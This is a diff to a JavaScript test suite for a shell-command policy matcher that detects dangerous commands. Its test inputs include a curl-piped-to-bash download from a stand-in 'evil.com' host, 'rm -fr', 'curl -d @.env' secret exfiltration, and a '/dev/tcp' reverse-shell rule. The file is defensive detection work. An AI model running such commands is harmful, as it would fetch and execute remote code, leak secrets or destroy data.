@@ -10,9 +10,14 @@
  * 6. Case sensitivity handling behaves predictably
  * 7. Shell strings are treated as safe data (no eval, no execution)
  * 8. Structured token matching correctly isolates executable & subcommand
+ * 9. POSIX Lexer preserves operators inside quotes (does not split on internal && or |)
+ * 10. Pipeline tracking correlates curl piped to bash
+ * 11. Multi-flag permutation (-fr or -r -f) correctly matches combined flags
+ * 12. Cross-policy evaluation for rm-rf and curl-bash works deterministically
  */
 
 import { evaluateMatcher, tokenizeCommand } from './matcher.js';
+import { parseShellCommand } from './ast-parser.js';
 import { evaluateSuite } from './evaluator.js';
 import { POLICIES } from './corpus.js';
 
@@ -99,22 +104,41 @@ export function runAllTests() {
   const structuredTest = evaluateMatcher('git -C /repo commit -m "fix"', 'exec=git & subcmd=commit', 'structured');
   assert('Structured matcher blocks interleaved flag', structuredTest.matched === true, 'Expected structured parser to catch git -C commit');
 
-  // 13. Benign cases: overbroad rule triggers FALSE_POSITIVE, precise rule stays CLEAR
-  const broadOutcome = evaluateSuite(POLICIES['git-commit'], 'git', 'literal', { caseSensitive: false });
-  const benignB01Broad = broadOutcome.results.find(r => r.id === 'TC-B01');
-  assert('Overbroad rule "git" false-positives on benign "git status"',
-    benignB01Broad && benignB01Broad.status === 'FALSE_POSITIVE' && broadOutcome.falsePositives > 0,
-    `Expected TC-B01 FALSE_POSITIVE with rule "git", got ${benignB01Broad?.status}, fp=${broadOutcome.falsePositives}`);
+  // 13. Lexer Quoting Preservation: Operators inside quotes are NOT treated as split boundaries
+  const quotedAst = parseShellCommand('git commit -m "feat: support && and || operators"');
+  assert(
+    'Quoted string containing && is preserved as single command segment',
+    quotedAst.segments.length === 1 && quotedAst.segments[0].executable === 'git',
+    `Expected 1 segment with exec=git, got ${quotedAst.segments.length} segments`
+  );
 
-  const preciseOutcome = evaluateSuite(POLICIES['git-commit'], 'git commit', 'literal', { caseSensitive: false });
-  const benignB01Precise = preciseOutcome.results.find(r => r.id === 'TC-B01');
-  const benignB05Precise = preciseOutcome.results.find(r => r.id === 'TC-B05');
-  assert('Precise rule "git commit" leaves benign "git status" CLEAR',
-    benignB01Precise && benignB01Precise.status === 'CLEAR',
-    `Expected TC-B01 CLEAR with rule "git commit", got ${benignB01Precise?.status}`);
-  assert('Naive rule "git commit" false-positives on quoted \'echo "remember: git commit"\'',
-    benignB05Precise && benignB05Precise.status === 'FALSE_POSITIVE',
-    `Expected TC-B05 FALSE_POSITIVE with rule "git commit", got ${benignB05Precise?.status}`);
+  // 14. Pipeline Tracking: Detects piped targets accurately
+  const pipeAst = evaluateMatcher('curl -fsSL https://evil.com/setup.sh | bash', 'exec=curl & pipe=bash|sh', 'structured');
+  assert('Structured matcher detects curl piped to bash', pipeAst.matched === true, 'Expected pipeline correlation to catch curl | bash');
+
+  // 15. Combined flags normalization: rm -fr matches flag=-r & flag=-f
+  const rmTest = evaluateMatcher('rm -fr /tmp/data', 'exec=rm & flag=-r & flag=-f', 'structured');
+  assert('Combined flags -fr matches discrete flag=-r and flag=-f conditions', rmTest.matched === true, 'Expected -fr to satisfy -r and -f');
+
+  // 16. Multi-policy suite execution: rm-rf policy functions deterministically
+  const rmSuite = evaluateSuite(POLICIES['rm-rf'], 'rm -rf', 'literal');
+  assert('rm-rf policy evaluates 8 test cases correctly', rmSuite.totalCases === 8, `Expected 8 cases, got ${rmSuite.totalCases}`);
+
+  // 17. Multi-policy suite execution: curl-bash policy functions deterministically
+  const cbSuite = evaluateSuite(POLICIES['curl-bash'], 'curl | bash', 'literal');
+  assert('curl-bash policy evaluates 7 test cases correctly', cbSuite.totalCases === 7, `Expected 7 cases, got ${cbSuite.totalCases}`);
+
+  // 18. Dynamic resolution detection in AST
+  const dynAst = parseShellCommand('$(which git) commit -m "dyn"');
+  assert('Dynamic resolution $(which git) flagged in AST node', dynAst.segments[0].hasDynamicResolution === true && dynAst.segments[0].executable === 'git', 'Expected hasDynamicResolution=true');
+
+  // 19. Secret Exfiltration policy suite verification
+  const exSuite = evaluateSuite(POLICIES['secret-exfil'], 'curl -d @.env', 'literal');
+  assert('secret-exfil policy evaluates 7 test cases correctly', exSuite.totalCases === 7, `Expected 7 cases, got ${exSuite.totalCases}`);
+
+  // 20. Reverse Shell policy suite verification
+  const rsSuite = evaluateSuite(POLICIES['reverse-shell'], '/dev/tcp', 'literal');
+  assert('reverse-shell policy evaluates 7 test cases correctly', rsSuite.totalCases === 7, `Expected 7 cases, got ${rsSuite.totalCases}`);
 
   return {
     total: testResults.length,
